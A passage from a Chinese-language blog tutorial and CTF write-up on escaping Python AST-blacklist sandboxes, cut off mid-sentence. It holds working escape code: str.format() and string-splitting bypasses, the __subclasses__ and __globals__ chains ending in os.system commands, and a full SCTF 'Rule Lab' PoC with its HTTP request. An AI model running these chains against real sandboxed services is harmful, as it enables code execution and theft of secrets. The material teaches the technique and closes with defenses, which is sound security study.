+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AST 看到的三个字符串常量，每个都不含黑名单词</span></span><br><span class="line">part1 = <span class="string">&quot;&#123;0.gi_&quot;</span></span><br><span class="line">part2 = <span class="string">&quot;frame.f_&quot;</span></span><br><span class="line">part3 = <span class="string">&quot;locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行时拼接</span></span><br><span class="line">field = part1 + part2 + part3</span><br><span class="line"><span class="comment"># field = &quot;&#123;0.gi_frame.f_locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># format() 在运行时执行属性链</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br><span class="line"><span class="comment"># 等价于: g.gi_frame.f_locals[&quot;shipment_manifest&quot;]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-对比：为什么直接写不行"><a href="#5-4-对比：为什么直接写不行" class="headerlink" title="5.4 对比：为什么直接写不行"></a>5.4 对比：为什么直接写不行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ❌ 直接被 AST 拦截</span></span><br><span class="line">g.gi_frame.f_locals[<span class="string">&quot;shipment_manifest&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ❌ 也会被拦截，字符串常量含黑名单词</span></span><br><span class="line">field = <span class="string">&quot;gi_frame.f_locals&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-5-变种"><a href="#5-5-变种" class="headerlink" title="5.5 变种"></a>5.5 变种</h3><h4 id="变种1：chr-函数绕过"><a href="#变种1：chr-函数绕过" class="headerlink" title="变种1：chr 函数绕过"></a>变种1：chr 函数绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line"><span class="comment"># g=chr(103), i=chr(105), _=chr(95)</span></span><br><span class="line">field = <span class="built_in">chr</span>(<span class="number">103</span>) + <span class="built_in">chr</span>(<span class="number">105</span>) + <span class="string">&quot;_frame.f_locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = (<span class="string">&quot;&#123;0.&quot;</span> + field).<span class="built_in">format</span>(g)</span><br></pre></td></tr></table></figure>
+
+<h4 id="变种2：bytes-解码绕过"><a href="#变种2：bytes-解码绕过" class="headerlink" title="变种2：bytes 解码绕过"></a>变种2：bytes 解码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">field = <span class="string">&quot;&#123;0.&quot;</span> + <span class="string">b&quot;gi_frame.f_locals&quot;</span>.decode() + <span class="string">&quot;[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br></pre></td></tr></table></figure>
+
+<h4 id="变种3：f-string-双层绕过"><a href="#变种3：f-string-双层绕过" class="headerlink" title="变种3：f-string 双层绕过"></a>变种3：f-string 双层绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">a = <span class="string">&quot;gi_&quot;</span></span><br><span class="line">b = <span class="string">&quot;frame&quot;</span></span><br><span class="line">field = <span class="string">f&quot;&#123;&#123;0.<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span>.f_locals[shipment_manifest]&#125;&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-6-与其他-bypass-的类比"><a href="#5-6-与其他-bypass-的类比" class="headerlink" title="5.6 与其他 bypass 的类比"></a>5.6 与其他 bypass 的类比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入:   &#x27; O&#x27; || &#x27;R&#x27; &#x27; 1&#x27;=&#x27;1      绕过 OR 关键词过滤</span><br><span class="line">SSTI:       &quot;cla&quot;~&quot;ss__&quot;             绕过 __class__ 过滤</span><br><span class="line">Python:     &quot;&#123;0.gi_&quot; + &quot;frame...&quot;    绕过 gi_frame 过滤</span><br></pre></td></tr></table></figure>
+
+<p><strong>共同本质</strong>：检测发生在编译&#x2F;解析阶段，绕过手段把敏感字符串推迟到运行时才组装。</p>
+<hr>
+<h2 id="第6章-其他逃逸手法"><a href="#第6章-其他逃逸手法" class="headerlink" title="第6章 其他逃逸手法"></a>第6章 其他逃逸手法</h2><h3 id="6-1-getattr-属性绕过"><a href="#6-1-getattr-属性绕过" class="headerlink" title="6.1 getattr() 属性绕过"></a>6.1 getattr() 属性绕过</h3><p>当属性名 <code>.gi_frame</code> 被拦截时，可以用 <code>getattr()</code> 函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AST 看到的是函数调用，不是属性访问节点</span></span><br><span class="line"><span class="built_in">getattr</span>(g, <span class="string">&quot;gi_frame&quot;</span>).f_locals</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>&quot;gi_frame&quot;</code> 字符串也被拦截：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(g, <span class="string">&quot;gi_&quot;</span> + <span class="string">&quot;frame&quot;</span>).f_locals</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-builtins-经典逃逸链"><a href="#6-2-builtins-经典逃逸链" class="headerlink" title="6.2 __builtins__ 经典逃逸链"></a>6.2 <code>__builtins__</code> 经典逃逸链</h3><p>在限制 <code>__builtins__</code> 的沙箱中，通过 <strong>object → 子类 → 危险模块</strong> 的链式逃逸：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: 拿到 object 类</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 列出 object 的所有子类</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 寻找有用的子类（常用目标）</span></span><br><span class="line"><span class="comment"># - &lt;class &#x27;os.wrap_close&#x27;&gt; → os 模块</span></span><br><span class="line"><span class="comment"># - &lt;class &#x27;warnings.catch_warnings&#x27;&gt; → 内置模块访问</span></span><br><span class="line"><span class="comment"># - &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt; → import 能力</span></span><br><span class="line"><span class="comment"># - &lt;class &#x27;subprocess.Popen&#x27;&gt; → 命令执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完整利用（找 BuiltinImporter）</span></span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&quot;BuiltinImporter&quot;</span>:</span><br><span class="line">        cls.load_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-函数对象的-globals"><a href="#6-3-函数对象的-globals" class="headerlink" title="6.3 函数对象的 __globals__"></a>6.3 函数对象的 <code>__globals__</code></h3><p>每个 Python 函数（包括 lambda）都有一个 <code>__globals__</code> 属性，指向定义该函数时的全局命名空间：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">f.__globals__         <span class="comment"># 包含模块的全局变量</span></span><br><span class="line">f.__globals__[<span class="string">&quot;__builtins__&quot;</span>]  <span class="comment"># ← 拿到内置函数</span></span><br><span class="line">f.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果函数名被拦截：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span>: <span class="number">0</span>).__globals__[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"><span class="comment"># lambda 也是函数，同样有 __globals__</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-异常回溯（traceback）"><a href="#6-4-异常回溯（traceback）" class="headerlink" title="6.4 异常回溯（traceback）"></a>6.4 异常回溯（traceback）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    e.__traceback__.tb_frame.f_globals[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line">    <span class="comment"># 通过异常对象的回溯帧访问全局作用域</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-5-sys-modules-缓存"><a href="#6-5-sys-modules-缓存" class="headerlink" title="6.5 sys.modules 缓存"></a>6.5 sys.modules 缓存</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&quot;os&quot;</span>]   <span class="comment"># 如果 os 之前被导入过，直接取缓存</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-6-绕过手法对照表"><a href="#6-6-绕过手法对照表" class="headerlink" title="6.6 绕过手法对照表"></a>6.6 绕过手法对照表</h3><table>
+<thead>
+<tr>
+<th>手法</th>
+<th>绕过对象</th>
+<th>核心机制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>str.format()</code></td>
+<td>AST 属性名黑名单</td>
+<td>format 字段解析在运行期</td>
+</tr>
+<tr>
+<td><code>getattr()</code></td>
+<td>AST 属性名黑名单</td>
+<td>函数调用而非属性节点</td>
+</tr>
+<tr>
+<td>字符串拼接</td>
+<td>字符串常量黑名单</td>
+<td>运行时拼接绕过编译期</td>
+</tr>
+<tr>
+<td><code>__subclasses__()</code></td>
+<td>没有 <code>builtins</code></td>
+<td>通过基类找到子类</td>
+</tr>
+<tr>
+<td><code>__globals__</code></td>
+<td>没有 <code>builtins</code></td>
+<td>函数对象的全局命名空间</td>
+</tr>
+<tr>
+<td><code>chr()</code> &#x2F; <code>bytes()</code></td>
+<td>字符串常量黑名单</td>
+<td>运行时生成字符串</td>
+</tr>
+<tr>
+<td><code>eval()</code> 嵌套</td>
+<td>多重限制</td>
+<td>二次执行绕过检查</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="第7章-实战：SCTF-Rule-Lab"><a href="#第7章-实战：SCTF-Rule-Lab" class="headerlink" title="第7章 实战：SCTF Rule Lab"></a>第7章 实战：SCTF Rule Lab</h2><h3 id="7-1-题目信息"><a href="#7-1-题目信息" class="headerlink" title="7.1 题目信息"></a>7.1 题目信息</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>题目名称</strong></td>
+<td>Rule Lab</td>
+</tr>
+<tr>
+<td><strong>比赛</strong></td>
+<td>SCTF</td>
+</tr>
+<tr>
+<td><strong>沙箱类型</strong></td>
+<td>AST 黑名单过滤型</td>
+</tr>
+<tr>
+<td><strong>核心漏洞</strong></td>
+<td><code>str.format()</code> 绕过 AST 属性检查</td>
+</tr>
+<tr>
+<td><strong>目标</strong></td>
+<td>读取生成器 frame 中的 <code>shipment_manifest</code></td>
+</tr>
+</tbody></table>
+<h3 id="7-2-沙箱设定"><a href="#7-2-沙箱设定" class="headerlink" title="7.2 沙箱设定"></a>7.2 沙箱设定</h3><p>服务端暴露了一个业务函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">iter_preview_items</span>():</span><br><span class="line">    shipment_manifest = load_manifest()  <span class="comment"># ← flag 内容加载到局部变量</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> preview_items:</span><br><span class="line">        <span class="keyword">yield</span> item                        <span class="comment"># ← yield，shipment_manifest 残留在 frame</span></span><br></pre></td></tr></table></figure>
+
+<p>沙箱核心逻辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code = user_input  <span class="comment"># 用户提交的代码</span></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(tree):</span><br><span class="line">    <span class="comment"># 拦截危险属性名</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Attribute):</span><br><span class="line">        <span class="keyword">if</span> node.attr <span class="keyword">in</span> FORBIDDEN_ATTRS:</span><br><span class="line">            <span class="keyword">raise</span> SandboxError(<span class="string">f&quot;forbidden attribute: <span class="subst">&#123;node.attr&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 拦截敏感字符串常量</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Constant) <span class="keyword">and</span> <span class="built_in">isinstance</span>(node.value, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> FORBIDDEN_STRINGS:</span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> node.value:</span><br><span class="line">                <span class="keyword">raise</span> SandboxError(<span class="string">f&quot;forbidden string: <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code)  <span class="comment"># 通过后执行</span></span><br></pre></td></tr></table></figure>
+
+<p>黑名单包含 <code>gi_frame</code>、<code>f_locals</code>、<code>f_globals</code> 等。</p>
+<h3 id="7-3-逐层分析"><a href="#7-3-逐层分析" class="headerlink" title="7.3 逐层分析"></a>7.3 逐层分析</h3><p><strong>目标</strong>：读取 <code>iter_preview_items()</code> 生成器内部 frame 中的 <code>shipment_manifest</code> 变量。</p>
+<p><strong>正常读取代码</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">g.gi_frame.f_locals[<span class="string">&quot;shipment_manifest&quot;</span>]   <span class="comment"># ❌ gi_frame 被拦截</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>字符串版</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">result = g.gi_frame.f_locals[<span class="string">&quot;shipment_manifest&quot;</span>]</span><br><span class="line"><span class="comment"># ❌ 属性名 gi_frame、f_locals 被拦截</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>用 getattr 绕过属性名</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(g, <span class="string">&quot;gi_frame&quot;</span>), <span class="string">&quot;f_locals&quot;</span>)[<span class="string">&quot;shipment_manifest&quot;</span>]</span><br><span class="line"><span class="comment"># ❌ &quot;gi_frame&quot; 字符串被字符串常量检查拦截</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>用 getattr + 字符串拼接</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(g, <span class="string">&quot;gi_&quot;</span> + <span class="string">&quot;frame&quot;</span>), <span class="string">&quot;f_locals&quot;</span>)[<span class="string">&quot;shipment_manifest&quot;</span>]</span><br><span class="line"><span class="comment"># ❌ getattr 中嵌套的 .f_locals 仍然会被 ast.Attribute 拦截</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>用 format 一次绕过</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># AST 看到的:</span></span><br><span class="line">part1 = <span class="string">&quot;&#123;0.gi_&quot;</span>      <span class="comment"># ← 不包含黑名单词</span></span><br><span class="line">part2 = <span class="string">&quot;frame.f_&quot;</span>    <span class="comment"># ← 不包含黑名单词  </span></span><br><span class="line">part3 = <span class="string">&quot;locals[shipment_manifest]&#125;&quot;</span>  <span class="comment"># ← 不包含黑名单词</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行时:</span></span><br><span class="line">field = part1 + part2 + part3</span><br><span class="line"><span class="comment"># field = &quot;&#123;0.gi_frame.f_locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br><span class="line"><span class="comment"># 等价于: g.gi_frame.f_locals[&quot;shipment_manifest&quot;]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-完整-PoC"><a href="#7-4-完整-PoC" class="headerlink" title="7.4 完整 PoC"></a>7.4 完整 PoC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">field = <span class="string">&quot;&#123;0.gi_&quot;</span> + <span class="string">&quot;frame.f_&quot;</span> + <span class="string">&quot;locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br></pre></td></tr></table></figure>
+
+<p>提交请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /api/rules/run</span><br><span class="line">Authorization: Bearer &lt;token&gt;</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;g = iter_preview_items()\nnext(g)\nfield = \&quot;&#123;0.gi_\&quot; + \&quot;frame.f_\&quot; + \&quot;locals[shipment_manifest]&#125;\&quot;\nresult = field.format(g)&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功响应：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCTF&#123;...&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;elapsedMs&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-5-知识链复盘"><a href="#7-5-知识链复盘" class="headerlink" title="7.5 知识链复盘"></a>7.5 知识链复盘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">题目给了: iter_preview_items() 生成器函数</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[知识点1] 生成器 yield 暂停，frame 不销毁</span><br><span class="line">   → 变量 shipment_manifest 仍存在于内存中</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[知识点2] 生成器对象有 gi_frame 属性</span><br><span class="line">   → g.gi_frame 可以拿到生成器的栈帧</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[知识点3] frame 对象有 f_locals 属性</span><br><span class="line">   → f_locals[&quot;shipment_manifest&quot;] 可读取 flag</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[知识点4] AST 黑名单</span><br><span class="line">   → 拦截 gi_frame、f_locals 出现在源码中</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[知识点5] str.format() 能做属性/下标访问</span><br><span class="line">   → &quot;&#123;0.gi_frame.f_locals[key]&#125;&quot;.format(g)</span><br><span class="line">   → 等价于 g.gi_frame.f_locals[&quot;key&quot;]</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[知识点6] 字符串拼接绕过 AST</span><br><span class="line">   → &quot;&#123;0.gi_&quot; + &quot;frame.f_&quot; + &quot;locals[shipment_manifest]&#125;&quot;</span><br><span class="line">   → AST 看到三个无害字符串自行拼接</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-6-其他绕过路径（拓展思路）"><a href="#7-6-其他绕过路径（拓展思路）" class="headerlink" title="7.6 其他绕过路径（拓展思路）"></a>7.6 其他绕过路径（拓展思路）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 chr() 构造字符串</span></span><br><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">field = <span class="string">&quot;&#123;0.&quot;</span> + <span class="built_in">chr</span>(<span class="number">103</span>) + <span class="built_in">chr</span>(<span class="number">105</span>) + <span class="string">&quot;_frame.f_locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 bytes.decode()</span></span><br><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">field = <span class="string">&quot;&#123;0.&quot;</span> + <span class="built_in">bytes</span>([<span class="number">103</span>, <span class="number">105</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>]).decode() + <span class="string">&quot;.f_locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 f_globals 实现 RCE</span></span><br><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">field = <span class="string">&quot;&#123;0.gi_&quot;</span> + <span class="string">&quot;frame.f_&quot;</span> + <span class="string">&quot;globals[__builtins__]&#125;&quot;</span></span><br><span class="line">builtins = field.<span class="built_in">format</span>(g)</span><br><span class="line">builtins[<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;cat /flag &gt; /tmp/out&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="第8章-防御与修复"><a href="#第8章-防御与修复" class="headerlink" title="第8章 防御与修复"></a>第8章 防御与修复</h2><h3 id="8-1-对出题者的修复建议"><a href="#8-1-对出题者的修复建议" class="headerlink" title="8.1 对出题者的修复建议"></a>8.1 对出题者的修复建议</h3><table>
+<thead>
+<tr>
+<th>#</th>
+<th>建议</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><strong>白名单而非黑名单</strong></td>
+<td>只允许安全属性，而非拦截已知危险属性</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>yield 后清理敏感变量</strong></td>
+<td><code>del shipment_manifest</code> 避免 frame 残留</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>禁用 str.format()</strong></td>
+<td>或限制格式字符串来源</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>覆盖生成器的 <strong>format</strong></strong></td>
+<td>阻止 format() 访问内部 frame</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>使用 RestrictedPython</strong></td>
+<td>成熟的白名单方案</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>禁用 <strong>builtins</strong></strong></td>
+<td><code>exec(code, {&quot;__builtins__&quot;: {}})</code></td>
+</tr>
+</tbody></table>
+<h3 id="8-2-针对-format-逃逸的防御"><a href="#8-2-针对-format-逃逸的防御" class="headerlink" title="8.2 针对 format 逃逸的防御"></a>8.2 针对 format 逃逸的防御</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遍历 AST 拦截所有 Call 节点中调用 format 的</span></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(tree):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Call):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.func, ast.Attribute) <span class="keyword">and</span> node.func.attr == <span class="string">&quot;format&quot;</span>:</span><br><span class="line">            <span class="keyword">raise</span> SandboxError(<span class="string">&quot;format is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>但攻击者可以继续绕过：</p>
